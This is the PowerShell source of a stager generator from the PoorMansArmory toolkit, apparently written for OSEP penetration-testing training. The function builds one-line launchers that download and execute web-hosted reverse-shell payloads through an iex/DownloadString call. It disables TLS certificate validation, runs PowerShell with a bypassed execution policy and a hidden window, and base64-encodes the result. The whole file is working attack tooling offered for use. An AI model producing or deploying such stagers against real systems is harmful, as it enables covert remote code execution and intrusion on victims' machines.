function Get-Stager {
#.SYNOPSIS
# Simple PowerShell stager generator to point to web hosted payloads.
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to create really simple custom stagers
# that point to web hosted payloads (normally reverse shells).  The only robust portion of 
# this script is the that it allows communication with the PMA server over HTTPS by preloading
# the stager with a self-signed certificate bypass if the payload URL is using HTTPS.
#
# As of version 3.0.0, simple command support has been added.  Now you can specify a simple
# command to execute if you don't want a complete reverse shell.  By default, the payload
# is returned based64 encoded.
# 
# Parameters:
#   -PayloadURL  -->  URL pointing to the reverse shell payload
#   -Command     -->  PowerShell command to execute instead of a reverse shell stager
#   -Raw         -->  Return stager payload in cleartext rather than base64
#   -Headless    -->  Create stager payload without '-' parameters
#   -Help        -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [string]$PayloadURL = 'http(s)://<ip_addr>/<payload>',
        [string]$Command,
        [switch]$Raw,
        [switch]$Headless,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return Get-Help Get-Stager }


    # Minor Error Correction
    if ($Command) { $PayloadURL = $NULL }
    else {
        if ($PayloadURL -eq 'http(s)://<ip_addr>/<payload>') { return (Write-Host 'Missing hosted payload URL.' -ForegroundColor Red) }
        if ($PayloadURL -notlike "http*") { return (Write-Host 'Invalid URL.' -ForegroundColor Red) }
    }


    # Bypass Self-Signed Certificate Restriction
    if ($PayloadURL -like "https:*") {
        $Bypass = @"
`$CertificateBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static void WebClientBypass()
    {
        ServicePointManager.ServerCertificateValidationCallback = Bypass;
    }
}
'@
Add-Type `$CertificateBypass
[SelfSignedCerts]::WebClientBypass()`n
"@;
    }
    else { $Bypass = $NULL }


    # Use a Specified Command instead of a Reverse Shell Stager
    if (!$Command) { $Payload = "iex ((New-Object System.Net.WebClient).DownloadString('$PayloadURL'))" }
    else           { $Payload = $Command }


    # Assemble Finalized Payload
    $Stager = $Bypass + $Payload


    # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
    if (!$Headless) { $Head = ' -nop -ex bypass -wi h' } 
    else            { $Head = $NULL                    }


     # Cleartext or Base64 Payload
    if (!$Raw) { $FinalStager = "powershell$Head -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
    else       { $FinalStager = "powershell$Head -c {$Stager}" }


    return $FinalStager
}